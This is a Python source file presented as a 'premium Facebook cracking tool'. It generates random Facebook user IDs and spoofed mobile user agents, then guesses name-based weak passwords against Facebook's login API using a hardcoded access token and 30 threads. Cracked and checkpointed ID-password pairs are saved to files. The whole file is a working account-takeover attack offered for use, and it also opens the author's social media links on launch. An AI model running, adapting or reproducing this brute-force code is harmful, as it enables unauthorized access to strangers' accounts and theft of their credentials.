import os
import sys
import re
import bs4
import ssl
import json
import time
import requests
import zlib
import uuid
import base64
import certifi
import socket as _socket
import random
import string
import struct
import hashlib
import platform
import datetime
import subprocess
import mechanize
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
from urllib.parse import urlencode
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool
os.system('pkg install espeak -y')

loop, count, oks, cps, twf, ugen = 0, 0, [], [], [], []

y = "\x1b[38;5;46m"
g = "\x1b[38;5;46m"
s = "\x1b[38;5;46m"
r = "\x1b[38;5;46m"
w = "\033[1;97m"

  
ugen = []
# 2018–2025 modern models
gt = random.choice([
    # Samsung Galaxy S-series (S9 → S24), A-series, M-series, Fold/Flip (2018–2025)
    'SM-G960F','SM-G965F',                 # S9 / S9+
    'SM-G970F','SM-G973F','SM-G975F',      # S10e / S10 / S10+
    'SM-G980F','SM-G985F','SM-G988B',      # S20 / S20+ / S20 Ultra
    'SM-G781B',                            # S20 FE
    'SM-G991B','SM-G996B','SM-G998B',      # S21 / S21+ / S21 Ultra
    'SM-G990B2',                           # S21 FE
    'SM-S901B','SM-S906B','SM-S908B',      # S22 series
    'SM-S911B','SM-S916B','SM-S918B',      # S23 series
    'SM-S921B','SM-S926B','SM-S928B',      # S24 series
    'SM-F900F','SM-F907B','SM-F916B','SM-F926B','SM-F936B','SM-F946B',  # Fold 1→5
    'SM-F700F','SM-F711B','SM-F721B','SM-F731B','SM-F741B',             # Flip 1→6
    'SM-A105F','SM-A107F','SM-A125F','SM-A127F','SM-A205F','SM-A207F',
    'SM-A305F','SM-A315F','SM-A326B','SM-A336B','SM-A346B',
    'SM-A505F','SM-A515F','SM-A525F','SM-A526B','SM-A536B',
    'SM-A546B','SM-A556B',                 # A54 / A55
    'SM-M205F','SM-M307F','SM-M315F','SM-M326B','SM-M336B',
    # Google Pixel (for diversity, 2019–2024)
    'Pixel 4','Pixel 4 XL','Pixel 5','Pixel 5a','Pixel 6','Pixel 6 Pro',
    'Pixel 6a','Pixel 7','Pixel 7 Pro','Pixel 7a','Pixel 8','Pixel 8 Pro',
    # Xiaomi / Redmi (2019–2024)
    'M2007J3SG','M2101K9G','2201123G','2211133G','23013PC75G',
    # OnePlus (2019–2025)
    'GM1913','IN2023','LE2113','LE2123','NE2213','CPH2413','CPH2449','CPH2573',
    # Realme (2019–2025)
    'RMX2170','RMX3031','RMX3301','RMX3312','RMX3561','RMX3663','RMX3700','RMX3800',
    # TECNO (2020–2025 popular)
    'TECNO-KG5k','TECNO-CH6','TECNO-AD8','TECNO-LH8n','TECNO-CK8n','TECNO-BG6','TECNO-BF7'
])

# -----------------------------
# Pattern 1: GT model (10,000)
# -----------------------------
for xd in range(10000):
    aa = 'Mozilla/5.0 (Linux; U; Android'
    b = random.choice(['9','10','11','12','13','14','15'])
    c = f' TL-tl; {str(gt)}'
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    # Chrome realistic range (2019–2025)
    h = random.randrange(80,128)  # Chrome 80–127+
    i = '0'
    j = random.randrange(4200,6100)
    k = random.randrange(40,200)
    l = 'Mobile Safari/537.36'
    uaku2 = f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

# --------------------------------
# Pattern 2: Windows user agents (10,000)
# --------------------------------
def windows():
    aV = str(random.choice(range(10,20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1,36)))
    bx = str(random.choice(range(34,38)))
    bz = f"5{bx}.{bV}"
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
    cV = str(random.choice(range(1,36)))
    cx = str(random.choice(range(34,38)))
    cz = f"5{cx}.{cV}"
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
    # Modern Windows 10/11 + Chrome 100–127
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.choice(range(100,128)))}.0.{str(random.choice(range(1000,9999)))}.0 Safari/537.36"
    return random.choice([A,B,C,D])

for _ in range(10000):
    ugen.append(windows())

# -----------------------------------
# Pattern 3: Samsung A/M-series (10,000)  [J-series replacement, structure same]
# -----------------------------------
for ua in range(10000):
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.choice(['8.1.0','9','10','11','12','13','14','15'])
    y = random.choice([
        'SM-A107F','SM-A125F','SM-A127F','SM-A205F','SM-A305F','SM-A315F','SM-A326B',
        'SM-A336B','SM-A346B','SM-A505F','SM-A515F','SM-A525F','SM-A536B','SM-A546B',
        'SM-M205F','SM-M307F','SM-M315F','SM-M326B','SM-M336B'
    ])
    c = 'Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d = random.randrange(80,128)
    e = '0'
    f = random.randrange(4000,7000)
    g = random.randrange(20,150)
    h = 'Mobile Safari/537.36'
    aalhaj = f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}"
    ugen.append(aalhaj)

# -----------------------------------
# Pattern 4: Realme devices (10,000)
# -----------------------------------
for ua in range(10000):
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.choice(['9','10','11','12','13','14','15'])
    y = random.choice([
        'RMX2170','RMX3031','RMX3301','RMX3312','RMX3363','RMX3491','RMX3561',
        'RMX3663','RMX3672','RMX3700','RMX3741','RMX3800'
    ])
    c = 'Build/TQ1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d = random.randrange(80,128)
    e = '0'
    f = random.randrange(4000,8000)
    g = random.randrange(20,150)
    h = 'Mobile Safari/537.36'
    alhajc = f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}"
    ugen.append(alhajc)

# -----------------------------------
# Pattern 5: Tecno devices (10,000)
# -----------------------------------
for ua in range(10000):
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.choice(['8','9','10','11','12','13','14','15'])
    xs = 'TECNO'
    nx = random.choice([
        'KG5k','CH6','AD8','LH8n','CK8n','BG6','BF7','CK7n','CH7n','CE9','KJ5','KH7','AE9','AB8','LA7'
    ])
    c = f'Build/TQ1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d = random.randrange(80,128)
    e = '0'
    f = random.randrange(4000,8000)
    g = random.randrange(20,200)
    h = 'Mobile Safari/537.36'
    alhajj = f"{a} {b}; {xs} {nx} {c}{d}.{e}.{f}.{g} {h}"
    ugen.append(alhajj)

# -----------------------------------
# Pattern 6: Windows Chrome agents (10,000)
# -----------------------------------
def ua():
    # Modern Chrome versions (100–127) with a realistic last component range
    ver = str(random.choice(range(100, 128)))
    ver2 = str(random.choice(range(50, 400)))
    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.{ver2} Safari/537.36"

for _ in range(10000):
    ugen.append(ua())

# -----------------------------------
# Pattern 7: Samsung Galaxy devices (10,000)
# -----------------------------------
for xd in range(10000):
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.choice(['9','10','11','12','13','14'])
    # Move from S9 to S24 family (keep structure: single fixed model string)
    c = 'SM-S921B Build/UP1A.231005.007; wv)'   # Galaxy S24 (example modern build tag)
    d = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    e = random.randrange(100,128)
    f = '0'
    g = random.randrange(5000,9999)
    h = random.randrange(40,200)
    i = 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/499.0.0.0.0;]'
    uakuh = f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
    ugen.append(uakuh)

# -----------------------------------
# Pattern 8: Samsung J-series alternate → A-series alt (10,000)
# -----------------------------------
for xd in range(10000):
    aa = 'Mozilla/5.0 (Linux; Android'
    b = random.choice(['8.1.0','9','10','11','12','13','14'])
    c = random.choice(['SM-A546B'])  # A54 5G (modern replacement)
    d = random.choice(string.ascii_uppercase)
    e = random.randrange(90,126)
    f = random.choice(string.ascii_uppercase)
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h = random.randrange(100,128)
    i = '0'
    j = random.randrange(5000,9999)
    k = random.randrange(40,200)
    l = 'Mobile Safari/537.36'
    uakuh = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uakuh)

# -----------------------------------
# Pattern 9: OnePlus devices (10,000)
# -----------------------------------
for xd in range(10000):
    aa = 'Mozilla/5.0 (Linux; U; Android'
    b = random.choice(['9','10','11','12','13','14'])
    c = random.choice(['CPH2573'])   # OnePlus 12R (modern)
    d = random.choice(string.ascii_uppercase)
    e = random.randrange(1, 999)
    f = random.choice(string.ascii_uppercase)
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h = random.randrange(100,128)
    i = '0'
    j = random.randrange(5000,9999)
    k = random.randrange(40,200)
    l = 'Mobile Safari/537.36'
    uakuh = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uakuh)

# -----------------------------------
# Pattern 10: Realme GT series (10,000)
# -----------------------------------
for xd in range(10000):
    aa = 'Mozilla/5.0 (Linux; U; Android'
    b = random.choice(['10','11','12','13','14'])
    c = ['en-us; RMX3301 Build/TKQ1.221114.001)']  # Realme GT 2 Pro era (modernized)
    d = random.choice(string.ascii_uppercase)
    e = random.randrange(1, 999)
    f = random.choice(string.ascii_uppercase)
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h = random.randrange(100,128)
    i = '0'
    j = random.randrange(5000,9999)
    k = random.randrange(40,200)
    l = 'Mobile Safari/537.36 HeyTapBrowser/45.7.0.0'
    uakuh = f'{aa} {b}; {c[0]}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uakuh)

# -------------------------------
# Trim to exactly 100,000 if needed
# -------------------------------
ugen = ugen[:100000]

# -------------------------------
# Print sample user agents
# -------------------------------
print(f"Generated {len(ugen)} user agents\n")
print("Sample User Agents:")
for i in range(5):
    print(f"{i+1}. {random.choice(ugen)}\n")      
        
try:
    if platform.system() == "Linux":
        os.system(
            'xdg-open https://www.facebook.com/profile.php?id=100004682100211')
        os.system('xdg-open https://wa.me/923079741690')
    elif platform.system() == "Windows":
        os.system(
            'start https://www.facebook.com/profile.php?id=100004682100211')
        os.system('start https://wa.me/923079741690')
    elif platform.system() == "Darwin":
        os.system(
            'open https://www.facebook.com/profile.php?id=100004682100211')
        os.system('open https://wa.me/923079741690')
except: 
    pass
	    
def linex():
    print(f'\r\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


def line():
    print(f'\r\n\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')



logo = f"""
\x1b[38;5;46m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\x1b[38;5;46m║                                           ║
\x1b[38;5;46m║    ███╗░░░███╗░█████╗░░█████╗░███████╗    ║
\x1b[38;5;46m║    ████╗░████║██╔══██╗██╔══██╗╚════██║    ║
\x1b[38;5;46m║    ██╔████╔██║███████║███████║░░███╔═╝    ║
\x1b[38;5;46m║    ██║╚██╔╝██║██╔══██║██╔══██║██╔══╝░░    ║
\x1b[38;5;46m║    ██║░╚═╝░██║██║░░██║██║░░██║███████╗    ║
\x1b[38;5;46m║    ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝    ║
\x1b[38;5;46m║                                           ║
\x1b[38;5;46m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝

\x1b[38;5;46m╔═══════════════════════════════════════════╗
\x1b[38;5;46m║     \033[1;97m[ PREMIUM FACEBOOK CRACKING TOOL ]     \x1b[38;5;46m║
\x1b[38;5;46m╚═══════════════════════════════════════════╝

\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mDEVELOPER   \x1b[38;5;46m▶  \033[1;97mMohammad MAAZ
\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mWHATSAPP    \x1b[38;5;46m▶  \033[1;97m+923079741690
\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mFEATURE     \x1b[38;5;46m▶  \033[1;97mOLD FACEBOOK CLONE
\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mVERSION     \x1b[38;5;46m▶  \033[1;97mv2.7 PREMIUM
\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mSTATUS      \x1b[38;5;46m▶  \033[1;97mFULLY WORKING ✓
\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""


def clear():
    os.system('clear')
    print(logo)


def main():
    clear()
    os.system('espeak -a 300 "Welcome to MAAZ tools"')

    animation = [
        "[\x1b[38;5;46m■\033[1;97m□□□□□□□□□]",
        "[\x1b[38;5;46m■■\033[1;97m□□□□□□□□]",
        "[\x1b[38;5;46m■■■\033[1;97m□□□□□□□]",
        "[\x1b[38;5;46m■■■■\033[1;97m□□□□□□]",
        "[\x1b[38;5;46m■■■■■\033[1;97m□□□□□]",
        "[\x1b[38;5;46m■■■■■■\033[1;97m□□□□]",
        "[\x1b[38;5;46m■■■■■■■\033[1;97m□□□]",
        "[\x1b[38;5;46m■■■■■■■■\033[1;97m□□]",
        "[\x1b[38;5;46m■■■■■■■■■\033[1;97m□]",
        "[\x1b[38;5;46m■■■■■■■■■■\033[1;97m]"
    ]

    for i in range(30):
        time.sleep(0.1)
        sys.stdout.write(
            f"\r\x1b[38;5;46m[\033[1;97mᯤ\x1b[38;5;46m] \x1b[38;5;46mLOADING...\033[1;97m "
            + animation[i % len(animation)] + "\033[1;97m ")
        sys.stdout.flush()
    clear()
    print(f'\x1b[38;5;46m[\033[1;97m🔥\x1b[38;5;46m] \033[1;97mFACEBOOK CLONING TOOL 2018-2025')
    linex()
    print(f'\x1b[38;5;46m[\033[1;97m1\x1b[38;5;46m] \033[1;97mSERIES SELECTION \x1b[38;5;46m[\x1b[38;5;46mSeries\x1b[38;5;46m/\x1b[38;5;46mBased\x1b[38;5;46m]\033[1;97m')
    linex()
    ch = input(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mSELECTION \x1b[38;5;46m▶ \033[1;97m')

    if ch in ('1', '01', '11', 'a', 'A'):
        SERIES_SELECTION()
    
def SERIES_SELECTION():
    user = []
    clear()
    print(f'\x1b[38;5;46m[\033[1;97m🔥\x1b[38;5;46m] \033[1;97mSELECT SERIES FOR CLONING:')
    linex()
    print(f'\x1b[38;5;46m[\033[1;97m1\x1b[38;5;46m] \033[1;97m1000 Series')
    print(f'\x1b[38;5;46m[\033[1;97m2\x1b[38;5;46m] \033[1;97m6155 Series')
    print(f'\x1b[38;5;46m[\033[1;97m3\x1b[38;5;46m] \033[1;97m6156 Series')
    print(f'\x1b[38;5;46m[\033[1;97m4\x1b[38;5;46m] \033[1;97m6157 Series')
    linex()
    
    series_choice = input(f'\x1b[38;5;46m[\033[1;97m🎯\x1b[38;5;46m] \033[1;97mSELECT SERIES \x1b[38;5;46m▶ \033[1;97m')
    
    # Simple series mapping
    series_map = {
        '1': '1000',
        '2': '6155', 
        '3': '6156',
        '4': '6157'
    }
    
    if series_choice in series_map:
        selected_series = series_map[series_choice]
        START_SERIES_CLONING(selected_series)
    else:
        print(f'\x1b[38;5;160m[\033[1;97m❌\x1b[38;5;160m] \033[1;97mINVALID SELECTION!')
        time.sleep(2)
        SERIES_SELECTION()

def START_SERIES_CLONING(series_code):
    user = []
    clear()
    
    print(f'\x1b[38;5;46m[\033[1;97m🔥\x1b[38;5;46m] \033[1;97mSELECTED SERIES: \x1b[38;5;46m{series_code}')
    print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mEXAMPLE \x1b[38;5;46m ▶ \033[1;97m10000\x1b[38;5;46m|\033[1;97m30000\x1b[38;5;46m|\033[1;97m50000\x1b[38;5;46m|\033[1;97m99999')
    linex()
    
    try:
        limit = int(input(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mSELECTION \x1b[38;5;46m▶ \033[1;97m'))
    except ValueError:
        print(f'\x1b[38;5;160m[\033[1;97m❌\x1b[38;5;160m] \033[1;97mINVALID NUMBER!')
        time.sleep(2)
        START_SERIES_CLONING(series_code)
        return
    
    linex()
    
    # Generate IDs with selected series code (15 digits total)
    for i in range(limit):
        if series_code == '1000':
            # For 1000 series - 11 more digits
            data = ''.join(random.choice(string.digits) for _ in range(11))
        else:
            # For 6155, 6156, 6157 series - 10 more digits  
            data = ''.join(random.choice(string.digits) for _ in range(10))
        
        uid = series_code + data
        user.append(uid)
    
    with tred(max_workers=30) as jihad:
        clear()
        print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mTOTAL ID \x1b[38;5;46m▶ \033[1;97m{len(user)}')
        print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mSERIES CODE \x1b[38;5;46m▶ \033[1;97m{series_code}')
        print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE')
        linex()
        # Generate random name for password guessing
        names = ["ali", "ahmed", "hassan", "khan", "malik", "shah", "user", "admin"]
        random_name = random.choice(names)
        
        for mal in user:
            uid = mal
            jihad.submit(login1, uid, random_name)
    
    line()
    print(f'\r\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mYOUR SERIES CRACKED HAS BEEN COMPLETED...\x1b[38;5;46m!')
    linex()
    print(f"\r\r\r\r\x1b[38;5;46m[\033[1;97mᯤ\x1b[38;5;46m] \033[1;97mTOTAL OK \x1b[38;5;46m▶ \x1b[38;5;46m{len(oks)}")
    linex()
    input(f'\x1b[38;5;46m[\033[1;97mᯤ\x1b[38;5;46m] \033[1;97mINTER TO BACK RAN AGAIN...\x1b[38;5;46m!\033[1;37m')
    main()

# Password generator with guessing logic
def generate_passwords(name):
    base_name = name.lower().replace(" ", "")
    patterns = ["123", "786", "1122", "12345", "khan", "khan786", "@123"]

    passwords = [f"{base_name}{p}" for p in patterns]  # Name-based
    passwords.append(base_name + str(random.randint(100, 999)))  # Random number
    passwords.append(base_name[:3] + str(random.randint(1000, 9999)))  # Short name + number
    
    # Guessing logic
    reversed_name = base_name[::-1]
    initials = "".join([part[0] for part in base_name.split() if part])
    passwords.append(reversed_name + "123")
    passwords.append(initials + "786")
    passwords.append(initials + str(random.randint(1000, 9999)))

    return list(set(passwords))  # Remove duplicates

# Updated login function with password guessing
def login1(uid, name="user"):
    global oks, loop, cps
    Session = requests.session()
    try:
        sys.stdout.write(
            f'\r\r\x1b[38;5;46m[\x1b[38;5;46mMaaz\x1b[38;5;46m-\x1b[38;5;46mB1\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\033[1;97m{loop}\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\x1b[38;5;46mOK\x1b[38;5;46m/\x1b[38;5;226mCP\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\x1b[38;5;46m{len(oks)}\x1b[38;5;46m/\x1b[38;5;46m{len(cps)}\x1b[38;5;46m]'
        )
        sys.stdout.flush()
        ua = random.choice(ugen)

        # Generate passwords dynamically from name
        for pw in generate_passwords(name):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            head = {
                'User-Agent': ua,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(20000, 30000)),
                'X-FB-SIM-HNI': str(random.randint(29000, 40000)),
                'X-FB-Connection-Type': random.choice(['MOBILE.LTE', 'WIFI', 'MOBILE.3G', 'MOBILE.4G']),
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group': str(random.randint(5000, 6000)),
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                'Content-Length': '706'
            }
            url = "https://b-graph.facebook.com/auth/login"
            try:
                rp = requests.post(url,
                                   data=data,
                                   headers=head,
                                   allow_redirects=False,
                                   verify=True).json()
                if "session_key" in rp:
                    oks.append(uid)
                    open("/sdcard/NEW_CLONING-OK.txt", "a").write(uid + "|" + pw + "\n")
                    print(f'\r\033[38;5;46m[MAAZ-OK] {uid} ● {pw}\033[1;97m')
                    os.system('espeak -a 300 "OK ID Found"')
                    break

                elif "www.facebook.com" in rp.get('error', {}).get('message', ''):
                    cps.append(uid)
                    open("/sdcard/NEW_CLONING-CP.txt", "a").write(uid + "|" + pw + "\n")
                    print(f'\r\033[38;5;226m[MAAZ-CP] {uid} ● {pw}\033[1;97m')
                    os.system('espeak -a 300 "Checkpoint ID"')
                    break
                else:
                    continue
            except:
                continue
        loop += 1
    except Exception as e:
        time.sleep(30)

# Run the program
if __name__ == "__main__":
    main()

